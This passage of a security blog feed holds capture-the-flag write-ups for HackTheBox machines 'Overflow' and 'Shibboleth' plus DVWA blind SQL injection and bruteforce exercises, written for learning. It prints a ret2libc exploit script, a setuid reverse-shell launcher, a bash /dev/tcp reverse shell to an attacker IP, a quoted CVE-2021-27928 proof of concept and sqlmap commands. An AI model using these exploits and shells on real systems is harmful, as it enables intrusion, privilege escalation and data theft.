│      ╰──&gt; 0x56602b5c      90             nop
│           0x56602b5d      8b5dfc         mov ebx, dword [ebp - 4]
│           0x56602b60      c9             leave
╰           0x56602b61      c3             ret
[0x56602ab0]&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<p>There are multiple calls to <code class="language-plaintext highlighter-rouge">scanf()</code>, which is used to read input from the user. So I opened the binary in debug mode and set a breakpoint after the first call to <code class="language-plaintext highlighter-rouge">scanf()</code> at <code class="language-plaintext highlighter-rouge">0x56635b03</code>. The instruction at <code class="language-plaintext highlighter-rouge">0x56635b09</code> compares the value of <code class="language-plaintext highlighter-rouge">eax</code> (which is where the PIN we entered is stored), with the value in <code class="language-plaintext highlighter-rouge">var_10h</code> (<code class="language-plaintext highlighter-rouge">ebp - 0x10</code>);</p>

<p><img src="/assets/img/20220223104118.png" alt="" /></p>

<p>Since the comparison is with <code class="language-plaintext highlighter-rouge">eax</code>, which is a 32 bit register, I read 4 bytes from the other operand, which gave <code class="language-plaintext highlighter-rouge">0xf3e6d338</code>. Converting this to 32 bit signed integer, I got <code class="language-plaintext highlighter-rouge">-202976456</code>;</p>

<p><img src="/assets/img/20220223104835.png" alt="" /></p>

<p>This value is the valid PIN, and it was accepted by the binary;</p>

<p><img src="/assets/img/20220223105044.png" alt="" /></p>

<p>After that, we were prompted for a name, and the program printed out a message, and then exit. The way the program reads the <strong>name</strong> could be vulnerable to <em>buffer overflow</em>. The name read is stored at <code class="language-plaintext highlighter-rouge">var_28h</code> (<code class="language-plaintext highlighter-rouge">ebp - 0x28</code>);</p>

<p><img src="/assets/img/20220223111120.png" alt="" /></p>

<p>A memory address in x86 is 32 bit. Since the destination address is 40 bytes (<code class="language-plaintext highlighter-rouge">0x28</code>) bytes away from the base of the stack frame (EBP), we will be able to overwrite the saved EBP of <code class="language-plaintext highlighter-rouge">main()</code> (the caller) after writing 40 bytes, and the EIP after 44 bytes. Testing this in <code class="language-plaintext highlighter-rouge">gdb</code>, it worked as expected. The binary is vulnerable to <em>buffer overflow</em> attack;</p>

<p><img src="/assets/img/20220223111853.png" alt="" /></p>

<p>And it gets better too, because ASLR is disabled on the box;</p>

<p><img src="/assets/img/20220223203858.png" alt="" /></p>

<p><br /></p>

<h4 id="exploitation-ret2libc">Exploitation: ret2libc</h4>
<p><br /></p>

<p>The binary has a non-executable stack (NX/DEP), so this won’t be as simple as loading shellcode into the stack, and jumping to it. An exploitation technique that can be used to get around this is <strong>return to libc</strong> (ret2libc) attack. This attack works by overwriting the EIP with the address of a function in the libc library (like <code class="language-plaintext highlighter-rouge">system</code> or <code class="language-plaintext highlighter-rouge">execv</code>), and passing it an argument we control (like the address of <code class="language-plaintext highlighter-rouge">/bin/sh</code> string in the libc library). This works because no code is executed on the stack.</p>

<p>To exploit this, I need to write <strong>44</strong> bytes of padding, followed by the address of <code class="language-plaintext highlighter-rouge">execv()</code> to overwrite the EIP. followed by the address of <code class="language-plaintext highlighter-rouge">exit()</code> which will be the return address for clean exit, and then followed by the address of a string containing the full path of the binary I wished to execute. I used <code class="language-plaintext highlighter-rouge">execv()</code> because unlike <code class="language-plaintext highlighter-rouge">system()</code>, it does not drop privileges when spawning a new process.</p>

<p>The first step is figuring out the address of <code class="language-plaintext highlighter-rouge">execv()</code>, <code class="language-plaintext highlighter-rouge">exit()</code>, and the environment variable <code class="language-plaintext highlighter-rouge">PAYLOAD</code> (which I set to the path of my reverse shell). For this, I wrote a simple C program;</p>

<pre><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

int main(){

  printf("Addr of system():   0x%08x\n", &amp;execv);
  printf("Addr of exit():     0x%08x\n", &amp;exit);
  printf("Addr of $PAYLOAD:   0x%08x\n", getenv("PAYLOAD"));
  
  return 0;
}
</code></pre>

<p>Notice how the address of <code class="language-plaintext highlighter-rouge">$PAYLOAD</code> changes based on the length of the filename;</p>

<p><img src="/assets/img/20220225070759.png" alt="" /></p>

<p>We need to account for this when calling the binary at <code class="language-plaintext highlighter-rouge">/opt/file_encrypt/file_encrypt</code>. Since it is 30 characters long, I renamed the address dumper to <code class="language-plaintext highlighter-rouge">/dev/shm/dump_addrssssssssssss</code>. This will give me the correct address of <code class="language-plaintext highlighter-rouge">$PAYLOAD</code> when calling <code class="language-plaintext highlighter-rouge">/opt/file_encrypt/file_encrypt</code>. We now have our valid addresses;</p>

<p><img src="/assets/img/20220225070932.png" alt="" /></p>

<p>Using python, I built a simple <em>ret2libc</em> payload;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python2
</span>
<span class="kn">import</span> <span class="nn">struct</span>

<span class="nb">buffer</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">44</span>

<span class="n">execv</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="mh">0xf7ea8730</span><span class="p">)</span>
<span class="nb">exit</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="mh">0xf7e194b0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="mh">0xffffdf44</span><span class="p">)</span>

<span class="k">print</span> <span class="s">"-202976456"</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span> <span class="o">+</span> <span class="nb">buffer</span> <span class="o">+</span> <span class="n">execv</span> <span class="o">+</span> <span class="nb">exit</span> <span class="o">+</span> <span class="n">payload</span>

</pre></td></tr></tbody></table></code></pre></div></div>

<p>I generated the buffer and saved it in my web directory;</p>

<p><img src="/assets/img/20220225071253.png" alt="" /></p>

<p>On the remote host, I set <code class="language-plaintext highlighter-rouge">PAYLOAD</code> to <code class="language-plaintext highlighter-rouge">/dev/shm/payload</code>, where payload is a shell script containing a simple bash reverse shell. The exploit worked, but I got a shell as my current user. The privileges were dropped;</p>

<p><img src="/assets/img/20220225071317.png" alt="" /></p>

<p><img src="/assets/img/20220225071333.png" alt="" /></p>

<p>So I wrote a simple C payload that will elevate to higher privileges using <code class="language-plaintext highlighter-rouge">setuid()</code> and <code class="language-plaintext highlighter-rouge">setgid()</code> before calling my reverse shell;</p>

<pre><code class="language-C">#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;

int main(){

  setuid(0);
  setgid(0);
  char *args[] = {"revshell.sh", NULL};
  execv("/dev/shm/revshell.sh", args);
  return 0;
}
</code></pre>

<p>I compiled and pushed the program to <code class="language-plaintext highlighter-rouge">/dev/shm/payload</code>, which is the value in my <code class="language-plaintext highlighter-rouge">$PAYLOAD</code> variable. Running the exploit again, I got a shell on the box as <strong>root</strong>;</p>

<p><img src="/assets/img/20220225072928.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Discovered port <strong>22</strong>, <strong>25</strong>, and <strong>80</strong> using <code class="language-plaintext highlighter-rouge">nmap</code></li>
  <li>Found an open signup on the website, and created a test account.</li>
  <li>Identified a possible username <strong>admin</strong> that exist on the website.</li>
  <li>Used <em>Oracle Padding</em> attack to craft a cookie that gave access to the account of <strong>admin</strong>
    <ul>
      <li>Found an SQL injection vulnerability in <code class="language-plaintext highlighter-rouge">/home/logs.php</code></li>
      <li>Used <code class="language-plaintext highlighter-rouge">sqlmap</code> to dump some hashes, and discovered the domain <strong>devbuild-job.overflow.htb</strong></li>
      <li>Gained access to the domain by cracking the salted hash of the user <strong>editor</strong></li>
    </ul>
  </li>
  <li><strong>devbuild-job.overflow.htb</strong>
    <ul>
      <li>Found a file upload form that is passed to <code class="language-plaintext highlighter-rouge">exiftool</code>.</li>
      <li>Exploited <strong>CVE-2021-22204</strong> to gain code execution as <strong>www-data</strong></li>
    </ul>
  </li>
  <li>Inside as <strong>www-data</strong>
    <ul>
      <li>Found 2 local users; <strong>developer</strong>, and <strong>tester</strong> (holds <code class="language-plaintext highlighter-rouge">user.txt</code>)</li>
      <li>Recovered MySQL credentials in config files of <strong>devbuild-job.overflow.htb</strong> domain.</li>
      <li>Gained access to account of <strong>developer</strong> due to password reuse.</li>
    </ul>
  </li>
  <li>Inside as <strong>developer</strong>
    <ul>
      <li>Identified a write access to <code class="language-plaintext highlighter-rouge">/etc/hosts</code></li>
      <li><code class="language-plaintext highlighter-rouge">pspy</code> showed requests to <code class="language-plaintext highlighter-rouge">http://taskmanage.overflow.htb/task.sh</code>, which I hijacked by editing the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file to gain code execution as <strong>tester</strong></li>
    </ul>
  </li>
  <li>Inside as <strong>tester</strong>
    <ul>
      <li>Found a SUID binary at <code class="language-plaintext highlighter-rouge">/opt/file_encrypt/file_encrypt</code></li>
      <li>Binary is protected by a PIN.</li>
      <li>Reversed the binary using <code class="language-plaintext highlighter-rouge">radare2</code> to extract the PIN.</li>
      <li>Identified a <em>buffer overflow</em> vulnerability in the binary.</li>
      <li>Performed a <em>ret2libc</em> attack to gain code execution as <strong>root</strong></li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="hard" /><category term="web" /><category term="smtp" /><category term="oracle padding" /><category term="padbuster" /><category term="execute after redirect" /><category term="sql injection" /><category term="sqlmap" /><category term="john" /><category term="python" /><category term="exiftool" /><category term="reverse engineering" /><category term="binary exploitation" /><category term="ret2libc" /><category term="nx" /><category term="radare2" /><summary type="html"><![CDATA[Overflow is an amazing hard-rated box on HackTheBox. To gain a foothold on the box, you will need to exploit an oracle padding vulnerability to gain access to an admin dashboard that’s vulnerable to SQL injection, use the SQL injection to retrieve and crack a hash for another domain, which is vulnerable to an exiftool RCE.]]></summary></entry><entry><title type="html">Shibboleth - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/shibboleth.html" rel="alternate" type="text/html" title="Shibboleth - HackTheBox" /><published>2022-04-02T00:00:00+01:00</published><updated>2022-04-02T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/shibboleth</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/shibboleth.html"><![CDATA[<p><strong>Shibboleth</strong> is a relatively easy medium linux box. It’s running an instance of <em>Zabbix</em> which you can identify by bruteforcing for hidden subdomains. Once discovered, you need to exploit an ASF-RMCP/IPMI service running on UDP port <strong>623</strong> to extract and crack the hash of an administrator, which will give you access to the Zabbix dashboard. The box itself is configured as a Zabbix agent, so you can use this to gain code execution. Once inside, you will be moving laterally to another user through password reuse, and gain root access to the box thanks to a vulnerable MySQL service.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/20211113204711.png" alt="" /></p>

<p><img src="/assets/img/20211113204757.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="recon">Recon</h3>
<p><br /></p>

<pre><code class="language-raw"># Nmap 7.70 scan initiated Sat Nov 13 20:49:39 2021 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.124
Nmap scan report for shibboleth.htb (10.10.11.124)
Host is up (0.24s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: FlexStart Bootstrap Template - Index

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov 13 20:50:24 2021 -- 1 IP address (1 host up) scanned in 45.09 seconds
</code></pre>

<h4 id="web">Web</h4>

<p><img src="/assets/img/20211113205454.png" alt="" /></p>

<p>Attempt to send an email using the contact-us form showed an error;</p>

<p><img src="/assets/img/20211113211043.png" alt="" /></p>

<p>Bruteforcing for subdomains with <code class="language-plaintext highlighter-rouge">ffuf</code> discovered 3;</p>

<p><img src="/assets/img/20211113210249.png" alt="" /></p>

<p>All the three subdomains show the same page;</p>

<p><img src="/assets/img/20211113210547.png" alt="" /></p>

<p>Hovering on the <em>help</em> link below the login form showed a URL to an online documentation that revealed the version number of <em>Zabbix</em>, which is <strong>5.0</strong>. Googling revealed a couple of vulnerabilities that require no authentication, but none of the ones I tested worked.</p>

<p>I was stuck at this for quite a while before remembering to do a UDP scan on the host. This is something I always completely forget to do, which should have been obvious since NMAP only discovered one TCP port on the target. Running <code class="language-plaintext highlighter-rouge">nmap</code> in UDP mode, I got a hit;</p>

<p><img src="/assets/img/20211114120214.png" alt="" /></p>

<p>Service scan with <code class="language-plaintext highlighter-rouge">nmap</code> identified it as <em>asf-rmcp</em>, which according to <em>Tenable</em>, is;</p>

<blockquote>
  <p>ASF is a DMTF standard that provides a remote control and alerting interface between management consoles and ASF-aware hosts. RMCP is <strong>a network protocol used by a management console to remotely control an ASF-aware</strong> host.</p>
</blockquote>

<p>Googling more about the service, the site <em>https://book.hacktricks.xyz</em> has some notes on it;</p>

<p><img src="/assets/img/20211114121645.png" alt="" /></p>

<p>Running the metasploit module showed above, I got a hash for a user named <em>Administrator</em>;</p>

<p><img src="/assets/img/20211114121835.png" alt="" /></p>

<p>Feeding the hash to <code class="language-plaintext highlighter-rouge">john</code>, it had no trouble cracking it (<code class="language-plaintext highlighter-rouge">ilovepumkinpie1</code>);</p>

<p><img src="/assets/img/20211114122027.png" alt="" /></p>

<p>Using the password, I was able to login to the <em>Zabbix</em> admin dashboard;</p>

<p><img src="/assets/img/20211114152359.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="foothold">Foothold</h3>
<p><br /></p>

<p>I have never worked with <em>Zabbix</em> before doing this box, so I had to read quite a bit on how it works. It’s basically a monitoring system used to monitor hosts, also referred to as Zabbix agents. In the <em>Zabbix</em> dashboard, there is an agent with the name <em>shibboleth.htb</em>;</p>

<p><img src="/assets/img/20211114161812.png" alt="" /></p>

<p>I learned that an “item”, which contain a “key”, can be added to an agent, and can be used to automate tasks that need to be performed after a defined interval. The key <code class="language-plaintext highlighter-rouge">system.run[]</code> is of interest to me as it can be used to run shell commands on an agent. Going to the <em>items</em> tab, I was given an option to create a key. So I created one that will ping my attack host after every one minute, and setup <code class="language-plaintext highlighter-rouge">tcpdump</code> to look for ICMP packets. It worked;</p>

<p><img src="/assets/img/20211114162432.png" alt="" /></p>

<p><img src="/assets/img/20211114162545.png" alt="" /></p>

<p>After saving the item, I got a callback after a moment;</p>

<p><img src="/assets/img/20211114162714.png" alt="" /></p>

<p>Adding a bash reverse shell in the <code class="language-plaintext highlighter-rouge">system.run[]</code> key works, but exited immediately after the shell has been spawned. I assumed this is because <em>Zabbix</em> is killing the spawned process, so I wrote a bash script named <code class="language-plaintext highlighter-rouge">shell.sh</code> that spawn a bash reverse shell as a background thread, download it on the host using <code class="language-plaintext highlighter-rouge">curl</code> , and execute it (I used the <code class="language-plaintext highlighter-rouge">test</code> button showed when creating an <code class="language-plaintext highlighter-rouge">Item</code> in <em>Zabbix</em> to run the command right away);</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="c"># Spawn the reverse shell in a background thread.</span>
bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.138/443 0&gt;&amp;1 &amp;
<span class="c"># Exit the main thread before Zabbix kills it :)</span>
<span class="nb">exit </span>0
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I got a stable reverse shell after that as the user <code class="language-plaintext highlighter-rouge">zabbix</code>;</p>

<p><img src="/assets/img/20211116172203.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>There is a user account named <code class="language-plaintext highlighter-rouge">ipmi-svc</code> on the host. Testing the password <code class="language-plaintext highlighter-rouge">ilovepumkinpie1</code> (which is the password for the Zabbix administrator) gave me access to the account, and the user flag;</p>

<p><img src="/assets/img/20211116172527.png" alt="" /></p>

<p>The user does not have any sudo access. <code class="language-plaintext highlighter-rouge">netstat</code> showed a MySQL service running locally on the host. So I started going through config files, and found a credential in <code class="language-plaintext highlighter-rouge">/etc/zabbix/zabbix_server.conf</code>;</p>

<p><img src="/assets/img/20211116173102.png" alt="" /></p>

<p>Using the credential, I was able to access the Zabbix database locally, and found <strong>3</strong> hashes in a table named <code class="language-plaintext highlighter-rouge">users</code>;</p>

<p><img src="/assets/img/20211116173407.png" alt="" /></p>

<p>The hash highlighted above is for a password I already have, and the one for the user <code class="language-plaintext highlighter-rouge">Zabbix</code> could not be cracked after <strong>+30</strong> minutes of bruteforce with <code class="language-plaintext highlighter-rouge">john</code>. So I moved on.</p>

<p>Checking the privileges of the <code class="language-plaintext highlighter-rouge">zabbix</code> MySQL user;</p>

<p><img src="/assets/img/20211116174547.png" alt="" /></p>

<p>Version number of MySQL components;</p>

<p><img src="/assets/img/20211116174652.png" alt="" /></p>

<p>Searching the version numbers using <code class="language-plaintext highlighter-rouge">searchsploit</code>, an exploit was found for the entry highlighted above;</p>

<p><img src="/assets/img/20211116175008.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre><span class="c"># Exploit Title: MariaDB 10.2 /MySQL - 'wsrep_provider' OS Command Execution</span>
<span class="c"># Date: 03/18/2021</span>
<span class="c"># Exploit Author: Central InfoSec</span>
<span class="c"># Version: MariaDB 10.2 before 10.2.37, 10.3 before 10.3.28, 10.4 before 10.4.18, and 10.5 before 10.5.9; Percona Server through 2021-03-03; and the wsrep patch through 2021-03-03 for MySQL</span>
<span class="c"># Tested on: Linux</span>
<span class="c"># CVE : CVE-2021-27928</span>

<span class="c"># Proof of Concept:</span>

<span class="c"># Create the reverse shell payload</span>
msfvenom <span class="nt">-p</span> linux/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;ip&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;port&gt; <span class="nt">-f</span> elf-so <span class="nt">-o</span> CVE-2021-27928.so

<span class="c"># Start a listener</span>
nc <span class="nt">-lvp</span> &lt;port&gt;

<span class="c"># Copy the payload to the target machine (In this example, SCP/SSH is used)</span>
scp CVE-2021-27928.so &lt;user&gt;@&lt;ip&gt;:/tmp/CVE-2021-27928.so

<span class="c"># Execute the payload</span>
mysql <span class="nt">-u</span> &lt;user&gt; <span class="nt">-p</span> <span class="nt">-h</span> &lt;ip&gt; <span class="nt">-e</span> <span class="s1">'SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";'</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Using the steps outlined above, I generated an <code class="language-plaintext highlighter-rouge">elf</code> reverse shell, download it on the host using <code class="language-plaintext highlighter-rouge">wget</code>, and exploit the flaw to gain root access to the box;</p>

<p><img src="/assets/img/20211116175800.png" alt="" /></p>

<p><img src="/assets/img/20211116175822.png" alt="" /></p>

<p><img src="/assets/img/20211116175839.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Identified a web service on the host on port <strong>80</strong> using <code class="language-plaintext highlighter-rouge">nmap</code></li>
  <li>Found <em>Zabbix</em> installation on the host by bruteforcing with <code class="language-plaintext highlighter-rouge">ffuf</code></li>
  <li>Identified an <code class="language-plaintext highlighter-rouge">asf-rmcp</code> service running on UDP port <strong>623</strong></li>
  <li>Used <code class="language-plaintext highlighter-rouge">auxiliary/scanner/ipmi/ipmi_dumphashes</code> metasploit module, and obtained the password hash of the user <code class="language-plaintext highlighter-rouge">Administrator</code>. Cracking it gave me access to the admin dashboard of Zabbix.</li>
  <li>Inside <em>Zabbix</em> dashboard;
    <ul>
      <li>Found a Zabbix agent with the name <code class="language-plaintext highlighter-rouge">shibboleth.htb</code></li>
      <li>Spawned a shell on it using <code class="language-plaintext highlighter-rouge">system.run[]</code> <em>Item</em> key, which gave me access to the box as <code class="language-plaintext highlighter-rouge">zabbix</code> user.</li>
    </ul>
  </li>
  <li>Inside the box as <code class="language-plaintext highlighter-rouge">zabbix</code>;
    <ul>
      <li>Identified a local user account with the username <code class="language-plaintext highlighter-rouge">ipmi-svc</code>.</li>
      <li>Gained access to the account due to password reuse.</li>
    </ul>
  </li>
  <li>Inside the box as <code class="language-plaintext highlighter-rouge">ipmi-svc</code>;
    <ul>
      <li>Found a credential for the local MySQL service used by the Zabbix installation.</li>
      <li>Identified a vulnerable component used by the server.</li>
      <li>Found an exploit using <code class="language-plaintext highlighter-rouge">searchsploit</code>, which gave me root access to the box.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="zabbix" /><category term="udp" /><category term="ipmi" /><category term="mysql" /><category term="wsrep" /><category term="metasploit" /><category term="asf-rmcp" /><summary type="html"><![CDATA[Shibboleth is a relatively easy medium linux box. It’s running an instance of Zabbix which you can identify by bruteforcing for hidden subdomains. Once discovered, you need to exploit an ASF-RMCP/IPMI service running on UDP port 623 to extract and crack the hash of an administrator, which will give you access to the Zabbix dashboard. The box itself is configured as a Zabbix agent, so you can use this to gain code execution. Once inside, you will be moving laterally to another user through password reuse, and gain root access to the box thanks to a vulnerable MySQL service.]]></summary></entry><entry><title type="html">Blind SQL Injection- DVWA</title><link href="https://4g3nt47.github.io/posts/dvwa/dvwa_blind_sqli.html" rel="alternate" type="text/html" title="Blind SQL Injection- DVWA" /><published>2022-03-27T00:00:00+01:00</published><updated>2022-03-27T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/dvwa/dvwa_blind_sqli</id><content type="html" xml:base="https://4g3nt47.github.io/posts/dvwa/dvwa_blind_sqli.html"><![CDATA[<p>This is an exercise in OWASP DVWA for exploiting blind SQL injection.</p>

<p><br /></p>

<h3 id="blind-sql-injection---dvwa">Blind SQL Injection - DVWA</h3>
<p><br /></p>

<h4 id="difficulty-easy">Difficulty: Easy</h4>
<p><br /></p>

<p>In this mode, we are given a simple form that checks if a user exists with the given ID;</p>

<p><img src="/assets/img/20220327082816.png" alt="" /></p>

<p>When given an invalid user ID, the application respond with this;</p>

<p><img src="/assets/img/20220327083013.png" alt="" /></p>

<p>The application appears to be vulnerable to <em>blind SQL injection</em> because injecting an SQL query that will always evaluate to true gave a positive output;</p>

<p><img src="/assets/img/20220327083207.png" alt="" /></p>

<p>Blind injections are a pain to exploit manually, so I called in <code class="language-plaintext highlighter-rouge">sqlmap</code>;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>sqlmap <span class="nt">-u</span> <span class="s1">'http://buster/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit'</span> <span class="nt">-p</span> <span class="nb">id</span> <span class="nt">--cookie</span> <span class="s1">'security=low; PHPSESSID=5c8siun1tr567gd519v1mivcbi'</span> <span class="nt">--dbs</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/20220327083557.png" alt="" /></p>

<p>Tables in <code class="language-plaintext highlighter-rouge">dvwa</code> database;</p>

<p><img src="/assets/img/20220327083621.png" alt="" /></p>

<p>Contents of <code class="language-plaintext highlighter-rouge">users</code> table;</p>

<p><img src="/assets/img/20220327083912.png" alt="" /></p>

<p>Blind SQL injections can be pretty slow, even with <code class="language-plaintext highlighter-rouge">sqlmap</code>. You can speed up the process by increasing the number of threads using the <code class="language-plaintext highlighter-rouge">--threads</code> argument, but this could easily corrupt the data being dumped when <code class="language-plaintext highlighter-rouge">sqlmap</code> is using a <em>time delay</em> technique in an unstable connection.</p>

<p><br /></p>

<h4 id="difficulty-medium">Difficulty: Medium</h4>
<p><br /></p>

<p>In this mode, we get a different form where the inputs are predefined in the form;</p>

<p><img src="/assets/img/20220327084414.png" alt="" /></p>

<p>The challenges are looking similar to the ones in error-based SQL injection section. Using a proxy and injecting an SQL query that always evaluate to true gives a positive result, indicating the application is vulnerable;</p>

<p><img src="/assets/img/20220327084936.png" alt="" /></p>

<p><img src="/assets/img/20220327085000.png" alt="" /></p>

<p>This is exploitable using <code class="language-plaintext highlighter-rouge">sqlmap</code>;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>sqlmap <span class="nt">-u</span> <span class="s1">'http://buster/dvwa/vulnerabilities/sqli_blind/'</span> <span class="nt">--data</span> <span class="s1">'id=1&amp;Submit=Submit'</span> <span class="nt">--cookie</span> <span class="s1">'security=medium; PHPSESSID=5c8siun1tr567gd519v1mivcbi'</span> <span class="nt">-p</span> <span class="nb">id</span> <span class="nt">--dbs</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/20220327085253.png" alt="" /></p>

<p><br /></p>

<h4 id="difficulty-high">Difficulty: High</h4>
<p><br /></p>

<p>This mode is also similar to the <em>high difficulty</em> level of the error-based SQL injection challenge. Only difference is this one is blind;</p>

<p><img src="/assets/img/20220327085544.png" alt="" /></p>]]></content><author><name></name></author><category term="dvwa" /><category term="dvwa" /><category term="sql injection" /><category term="sqlmap" /><summary type="html"><![CDATA[This is an exercise in OWASP DVWA for exploiting blind SQL injection.]]></summary></entry><entry><title type="html">Bruteforce - DVWA</title><link href="https://4g3nt47.github.io/posts/dvwa/dvwa_bruteforce.html" rel="alternate" type="text/html" title="Bruteforce - DVWA" /><published>2022-03-27T00:00:00+01:00</published><updated>2022-03-27T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/dvwa/dvwa_bruteforce</id><content type="html" xml:base="https://4g3nt47.github.io/posts/dvwa/dvwa_bruteforce.html"><![CDATA[<p>This is an exercise in OWASP DVWA on login bruteforcing.</p>

<p><br /></p>

<h3 id="bruteforce---dvwa">Bruteforce - DVWA</h3>
<p><br /></p>

<h4 id="difficulty-easy">Difficulty: Easy</h4>
<p><br /></p>

<p>In this mode, we were presented with a login form;</p>

<p><img src="/assets/img/20220323102403.png" alt="" /></p>

<p>The form is submitted in a GET request with not CSRF tokens;</p>

<p><img src="/assets/img/20220323102539.png" alt="" /></p>

<p>This was a piece of cake to bruteforce using <code class="language-plaintext highlighter-rouge">ffuf</code>. All we had to do is get our session cookie for the application since the form is only accessible by logged in users, and filter out the login error message, which is <code class="language-plaintext highlighter-rouge">Username and/or password incorrect</code>;</p>

<p><img src="/assets/img/20220323102823.png" alt="" /></p>

<p><br /></p>

<h4 id="difficulty-medium">Difficulty: Medium</h4>
<p><br /></p>

<p>We get the same login form, and it’s also submitted in a POST request. The only difference I can see is the delay in response by the server. This will slow down bruteforce attacks. Using <code class="language-plaintext highlighter-rouge">ffuf</code> to bruteforce the login showed some errors, and eventually the whole application appears to hang, even when requesting other pages. However, this delay appears to be tied only to the session cookie I’m using to do the bruteforce because no such delay was observed in another session.</p>

<p><img src="/assets/img/20220323110648.png" alt="" /></p>

<p>The bruteforce succeded after forcing <code class="language-plaintext highlighter-rouge">ffuf</code> to only use a single thread, which is slow;</p>

<p><img src="/assets/img/20220323111121.png" alt="" /></p>

<p><br /></p>

<h4 id="difficulty-high">Difficulty: High</h4>
<p><br /></p>

<p>In this mode, we get a similar login form again, but with a CSRF token;</p>

<p><img src="/assets/img/20220323111507.png" alt="" /></p>

<p>Altering the CSRF token showed that it’s being validated by the web application;</p>

<p><img src="/assets/img/20220323111729.png" alt="" /></p>

<table>
  <tbody>
    <tr>
      <td>This means we need to account for this during our bruteforce. Earlier, we [[Initial Access#Making a Bruteforcer</td>
      <td>made something similar]] for bruteforcing the main login page of DVWA.</td>
    </tr>
  </tbody>
</table>

<p>This time, we are going to do something similar, but a little bit more advance. We will make the program multi-threaded.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
#------------------------------------------------------------------
# A bruteforcer for DVWA's bruteforce challenge 3 (high difficulty)
#                                 Author: https://4g3nt47.github.io
#------------------------------------------------------------------
</span>
<span class="kn">import</span> <span class="nn">os</span><span class="p">,</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">threading</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
<span class="kn">from</span> <span class="nn">queue</span> <span class="kn">import</span> <span class="n">Queue</span>

<span class="k">class</span> <span class="nc">l3_bruteforcer</span><span class="p">:</span>

  <span class="c1"># The class initializer.
